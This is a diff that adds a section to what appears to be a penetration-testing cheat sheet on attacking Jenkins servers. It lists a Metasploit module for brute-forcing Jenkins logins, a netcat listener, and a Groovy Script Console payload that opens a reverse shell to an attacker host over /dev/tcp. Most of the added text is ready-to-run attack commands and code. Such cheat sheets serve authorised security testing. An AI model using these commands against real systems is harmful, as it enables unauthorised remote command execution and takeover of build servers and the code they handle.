@@ -1,5 +1,41 @@
 # Jenkins
 
+Jenkins is an automation server which helps automate the parts of software development related to building, testing, and deploying, etc.
+
+### Brute Force Credentials <a href="#brute-force-credentials" id="brute-force-credentials"></a>
+
+```shellscript
+msfconsole
+msf > use auxiliary/scanner/http/jenkins_login
+```
+
+### Reverse Shell on Dashboard <a href="#reverse-shell-on-dashboard" id="reverse-shell-on-dashboard"></a>
+
+You need to have the credential.
+
+1. **Opening Listener on Your Local Machine**
+
+```shellscript
+nc -lvnp 4444
+```
+
+1. **Login to Jenkins**
+
+Access "http://localhost:8080" in browser and login.
+
+1. **Click "Manage Jenkins" -> "Script Console"**
+2. **Add the Payload in the Console**
+
+```shellscript
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/<Attacker_IP>/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+1. **Click "Run"**
+
+Then you should get a shell.
+
 ## Jenkins
 
 ```shellscript
